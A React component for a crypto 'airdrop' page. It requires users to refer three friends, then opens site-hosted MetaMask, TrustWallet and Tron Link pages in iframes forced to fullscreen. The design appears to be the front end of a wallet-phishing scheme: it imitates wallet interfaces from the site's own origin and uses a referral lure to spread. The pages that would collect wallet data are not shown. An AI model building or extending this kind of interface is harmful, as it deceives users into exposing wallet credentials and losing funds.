import React, { useState, useRef, useEffect } from 'react';
import './Airdrop.css';
import axios from 'axios';

const Airdrop: React.FC = () => {
  const [showMetamaskPage, setShowMetamaskPage] = useState(false);
  const [showTrustWalletPage, setShowTrustWalletPage] = useState(false);
  const [showTronLinkPage, setShowTronLinkPage] = useState(false);
  const [friendsCount, setFriendsCount] = useState(0);
  const iframeRef = useRef<HTMLIFrameElement | null>(null);

  useEffect(() => {
    // Fetch friends count from API
    const fetchFriendsCount = async () => {
      try {
        const token = localStorage.getItem('token'); // Or however you store the token
        const response = await axios.get('/api/referral/', {
          headers: { Authorization: `Bearer ${token}` }
        });
        // Assuming the response data has a 'friendsCount' field
        setFriendsCount(response.data.friendsCount);
      } catch (error) {
        console.error('Error fetching friends count:', error);
      }
    };

    fetchFriendsCount();
  }, []);

  const handleAirdropClick = (link: string) => {
    window.location.href = link; // Navigate to the respective wallet page
  };

  const handleMetamaskClick = () => {
    setShowMetamaskPage(true);
    setShowTrustWalletPage(false);
    setShowTronLinkPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const handleTrustWalletClick = () => {
    setShowTrustWalletPage(true);
    setShowMetamaskPage(false);
    setShowTronLinkPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const handleTronLinkClick = () => {
    setShowTronLinkPage(true);
    setShowMetamaskPage(false);
    setShowTrustWalletPage(false); // Ensure other pages are hidden
    setTimeout(() => {
      if (iframeRef.current) {
        enterFullscreen(iframeRef.current);
      }
    }, 0);
  };

  const enterFullscreen = (element: HTMLElement) => {
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if ((element as any).mozRequestFullScreen) { // Firefox
      (element as any).mozRequestFullScreen();
    } else if ((element as any).webkitRequestFullscreen) { // Chrome, Safari, and Opera
      (element as any).webkitRequestFullscreen();
    } else if ((element as any).msRequestFullscreen) { // IE/Edge
      (element as any).msRequestFullscreen();
    }
  };

  return (
    <div className="airdrop-container">
      {friendsCount >= 3 ? (
        <div>
          <h2 className="airdrop-title">Airdrop Available!</h2>
          <button className="airdrop-button" onClick={handleMetamaskClick}>
            Airdrop Now
          </button>
          <div className="wallet-options">
            <h3>Select Your Wallet:</h3>
            <div className="wallet-option" onClick={handleMetamaskClick}>
              <img src="/path/to/metamaskIcon.png" alt="MetaMask" />
              <p>MetaMask</p>
            </div>
            <div className="wallet-option" onClick={handleTrustWalletClick}>
              <img src="/path/to/trustwalletIcon.png" alt="TrustWallet" />
              <p>TrustWallet</p>
            </div>
            <div className="wallet-option" onClick={handleTronLinkClick}>
              <img src="/path/to/tronLinkIcon.png" alt="Tron Link" />
              <p>Tron Link</p>
            </div>
          </div>
        </div>
      ) : (
        <p className="airdrop-message">
          You must refer 3 friends to the app to be eligible for the airdrop.
        </p>
      )}

      {showMetamaskPage && (
        <iframe ref={iframeRef} src="/metamask.html" className="metamask-frame" title="MetaMask Page"></iframe>
      )}

      {showTrustWalletPage && (
        <iframe ref={iframeRef} src="/trustwallet.html" className="trustwallet-frame" title="TrustWallet Page"></iframe>
      )}

      {showTronLinkPage && (
        <iframe ref={iframeRef} src="/tron.html" className="tronlink-frame" title="Tron Link Page"></iframe>
      )}
    </div>
  );
};

export default Airdrop;
